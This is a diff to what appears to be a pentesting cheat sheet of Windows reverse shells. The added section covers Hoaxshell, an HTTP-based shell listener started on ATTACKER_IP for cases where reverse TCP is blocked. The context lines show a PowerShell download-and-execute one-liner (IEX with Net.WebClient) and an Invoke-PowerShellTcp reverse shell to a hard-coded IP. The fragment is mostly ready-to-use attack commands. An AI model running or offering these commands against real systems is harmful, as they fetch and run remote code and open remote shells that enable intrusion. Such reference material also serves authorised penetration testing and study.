@@ -32,6 +32,14 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.7.24
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
 ```
 
+### Hoaxshell
+
+[Hoaxshell](https://github.com/t3l3machus/hoaxshell) is useful when traditional reverse TCP payloads are blocked but outbound HTTP(S) is allowed.
+
+```bash
+python3 hoaxshell.py -s ATTACKER_IP -p 8080
+```
+
 ### **Powershell Reverse UDP**
 
 ```powershell
